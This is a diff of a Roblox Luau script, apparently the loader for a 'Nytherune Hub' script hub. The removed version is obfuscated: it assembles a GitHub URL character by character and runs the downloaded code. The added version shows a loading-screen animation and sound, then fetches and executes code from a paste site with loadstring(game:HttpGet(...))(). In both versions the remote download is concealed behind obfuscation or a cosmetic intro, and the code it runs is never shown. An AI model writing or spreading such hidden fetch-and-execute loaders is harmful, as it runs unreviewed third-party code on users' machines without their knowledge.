@@ -1,107 +1,121 @@
--- [[ This Luau Script was encrypted with LuauEclipse v16.1.2 ]]
-print("tenta a sorte skidder")
-local ng3OSgaH = string.char(32)
-local IcmrXGDl = string.char(33)
-local FyzoBQ1S = string.char(34)
-local oMeNWvoo = string.char(35)
-local sbAz2hkx = string.char(36)
-local lVVfjJXL = string.char(37)
-local F0MvujjG = string.char(38)
-local IVLb9Kuz = function() end
-local heeL9l9K = string.char(39)
-local N4djPn7k = string.char(40)
-local bqhNymx8 = string.char(41)
-local ycqhQhrb = 'Ie87Z44G'
-local jRds4_bh = string.char(42)
-local HZuHD33j = string.char(43)
-local yAesVVER = string.char(44)
-local ctcWxbqC = string.char(45)
-local Eos2MhBz = string.char(46)
-local yyfSUskJ = string.char(47)
-local YTRou1Tg = string.char(48)
-local YQu6pIm3 = string.char(49)
-local M2gkeSR7 = string.char(50)
-local Go6PT9rD = string.char(51)
-local h2FazaVF = string.char(52)
-local ycqhQhrb = 'Ie87Z44G'
-local cjjD_8JT = string.char(53)
-local tSSz_adV = string.char(54)
-local xsvz6OTT = string.char(55)
-local kKNSN6uJ = string.char(56)
-local IVLb9Kuz = function() end
-local YBP1f6z4 = string.char(57)
-local nx54cnYD = string.char(58)
-local qqdZqQhq = string.char(59)
-local Q80mTmUO = string.char(60)
-local Fakc69Ha = string.char(61)
-local jJUyV4iV = string.char(62)
-local FFUYtaMq = string.char(63)
-local oYipRXqR = string.char(64)
-local Od4lvMgm = string.char(65)
-local ISCiZxXF = string.char(66)
-local iD4kLMH9 = string.char(67)
-local wsLuR4Tq = string.char(68)
-local hDCF6yB9 = string.char(69)
-local eozh2_S4 = string.char(70)
-local aH5JItuj = string.char(71)
-local TxoDvxXG = string.char(72)
-local vYT9juTT = string.char(73)
-local YXLRFuqU = string.char(74)
-local eIBdLqqx = string.char(75)
-local kqkWYvSM = string.char(76)
-local IVLb9Kuz = function() end
-local BXpmlVJz = string.char(77)
-local lrrCwiLV = string.char(78)
-local WJRkWCNC = string.char(79)
-local IVLb9Kuz = function() end
-local zYRvzHsV = string.char(80)
-local qVczfsjK = string.char(81)
-local VHmHNplt = string.char(82)
-local j04ZGsfs = string.char(83)
-local hpncmxb9 = string.char(84)
-local UuihZFau = string.char(85)
-local vfqY7z1u = string.char(86)
-local o69LFbzM = string.char(87)
-local MKQo48qc = string.char(88)
-local QHgF3o1y = string.char(89)
-local GGHboYIZ = string.char(90)
-local LE1TRPFm = string.char(91)
-local aSsz_u9O = string.char(92)
-local tlkycDln = string.char(93)
-local C9I1usE4 = string.char(94)
-local EU1ve2d0 = string.char(95)
-local o6aV__2U = string.char(96)
-local gx6UalY1 = string.char(97)
-local BXZcimUv = string.char(98)
-local K6Bwl1HC = string.char(99)
-local IjdRF4t7 = string.char(100)
-local ja1vrbyz = string.char(101)
-local D_unJxHW = string.char(102)
-local lUIYpfVG = string.char(103)
-local q4o_wFle = string.char(104)
-local pDjiB_fH = string.char(105)
-local GIkjzKfc = string.char(106)
-local f657m_vi = string.char(107)
-local JRSkTUSw = string.char(108)
-local fUJ05LwB = string.char(109)
-local STjf9hNb = string.char(110)
-local s0PHHiaN = string.char(111)
-local vLln8BUB = string.char(112)
-local aMQKQO22 = string.char(113)
-local v86pZJrk = string.char(114)
-local r4V5T43j = string.char(115)
-local xPK5HTSu = string.char(116)
-local UKY2bxsy = string.char(117)
-local qH74FWLH = string.char(118)
-local XtmL_Brv = string.char(119)
-local usRldSYd = string.char(120)
-local PWa4p6sP = string.char(121)
-local zPmpEGDP = string.char(122)
-local JIiVLtW4 = string.char(123)
-local jd_4Osml = string.char(124)
--- hwKPTy5A
-local GtFWXJtB = string.char(125)
-local TL28H7A9 = 12
-local BD0yFmDt = string.char(126)
 
-loadstring(game:HttpGet((q4o_wFle .. xPK5HTSu .. xPK5HTSu .. vLln8BUB .. r4V5T43j .. nx54cnYD .. yyfSUskJ .. yyfSUskJ .. v86pZJrk .. gx6UalY1 .. XtmL_Brv .. Eos2MhBz .. lUIYpfVG .. pDjiB_fH .. xPK5HTSu .. q4o_wFle .. UKY2bxsy .. BXZcimUv .. UKY2bxsy .. r4V5T43j .. ja1vrbyz .. v86pZJrk .. K6Bwl1HC .. s0PHHiaN .. STjf9hNb .. xPK5HTSu .. ja1vrbyz .. STjf9hNb .. xPK5HTSu .. Eos2MhBz .. K6Bwl1HC .. s0PHHiaN .. fUJ05LwB .. yyfSUskJ .. r4V5T43j .. ja1vrbyz .. K6Bwl1HC .. v86pZJrk .. ja1vrbyz .. xPK5HTSu .. ctcWxbqC .. PWa4p6sP .. gx6UalY1 .. STjf9hNb .. ctcWxbqC .. JRSkTUSw .. UKY2bxsy .. gx6UalY1 .. UKY2bxsy .. yyfSUskJ .. iD4kLMH9 .. gx6UalY1 .. JRSkTUSw .. gx6UalY1 .. BXZcimUv .. s0PHHiaN .. K6Bwl1HC .. gx6UalY1 .. gx6UalY1 .. yyfSUskJ .. v86pZJrk .. ja1vrbyz .. D_unJxHW .. r4V5T43j .. yyfSUskJ .. q4o_wFle .. ja1vrbyz .. gx6UalY1 .. IjdRF4t7 .. r4V5T43j .. yyfSUskJ .. fUJ05LwB .. gx6UalY1 .. pDjiB_fH .. STjf9hNb .. yyfSUskJ .. STjf9hNb .. PWa4p6sP .. STjf9hNb .. Eos2MhBz .. JRSkTUSw .. UKY2bxsy .. gx6UalY1 .. UKY2bxsy)))()
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "IntroUI"
+gui.Parent = player:WaitForChild("PlayerGui")
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+
+-- Fundo
+local bg = Instance.new("Frame")
+bg.Size = UDim2.fromScale(1, 1)
+bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+bg.BorderSizePixel = 0
+bg.Parent = gui
+
+-- Texto central
+local title = Instance.new("TextLabel")
+title.Text = "Nytherune Hub"
+title.Font = Enum.Font.GothamBold
+title.TextScaled = true
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundTransparency = 1
+title.AnchorPoint = Vector2.new(0.5, 0.5)
+title.Position = UDim2.fromScale(0.5, 0.4)
+title.Size = UDim2.fromScale(0.6, 0.2)
+title.Parent = bg
+
+-- Barra de carregamento (fundo)
+local barBG = Instance.new("Frame")
+barBG.Size = UDim2.new(0.5, 0, 0.03, 0)
+barBG.Position = UDim2.fromScale(0.25, 0.65)
+barBG.BackgroundColor3 = Color3.fromRGB(60, 0, 60)
+barBG.BorderSizePixel = 0
+barBG.Parent = bg
+
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBG
+
+-- Função para criar quadrados partículas
+local function createSquare()
+    local sq = Instance.new("Frame")
+    sq.Size = UDim2.fromOffset(math.random(30, 60), math.random(30, 60))
+    sq.Position = UDim2.fromScale(math.random(), -0.1)
+    sq.BackgroundTransparency = 1
+    sq.AnchorPoint = Vector2.new(0.5, 0.5)
+    sq.Parent = bg
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0.3, 0)
+    corner.Parent = sq
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Thickness = 2
+    stroke.Color = Color3.fromRGB(255, 140, 0)
+    stroke.Parent = sq
+
+    -- movimento
+    task.spawn(function()
+        local rotation = math.random(-30, 30)
+        local duration = math.random(4, 7)
+        local goal = {
+            Position = UDim2.fromScale(math.random(), 1.2),
+            Rotation = rotation
+        }
+        local tween = TweenService:Create(sq, TweenInfo.new(duration, Enum.EasingStyle.Linear), goal)
+        tween:Play()
+        tween.Completed:Wait()
+        sq:Destroy()
+    end)
+end
+
+-- Spawner de partículas
+task.spawn(function()
+    while gui.Parent do
+        createSquare()
+        task.wait(0.2)
+    end
+end)
+
+-- Animação da barra de carregamento
+TweenService:Create(barFill, TweenInfo.new(5, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+
+-- Após 5s, fade out
+task.delay(5, function()
+    local fadeTween = TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 1})
+    fadeTween:Play()
+    for _, obj in ipairs(bg:GetDescendants()) do
+        if obj:IsA("TextLabel") then
+            TweenService:Create(obj, TweenInfo.new(1), {TextTransparency = 1}):Play()
+        elseif obj:IsA("Frame") then
+            TweenService:Create(obj, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
+        elseif obj:IsA("UIStroke") then
+            TweenService:Create(obj, TweenInfo.new(1), {Transparency = 1}):Play()
+        end
+    end
+    fadeTween.Completed:Wait()
+    gui:Destroy()
+end)
+-- LocalScript (StarterGui)
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Parent = player:WaitForChild("PlayerGui")
+
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://9044739323"
+sound.Volume = 1
+sound.Looped = false
+sound.Parent = gui
+sound:Play()
+
+
+loadstring(game:HttpGet("https://scriptsbins.vercel.app/raw/xFdud5LYyXwGVcHf482C"))()
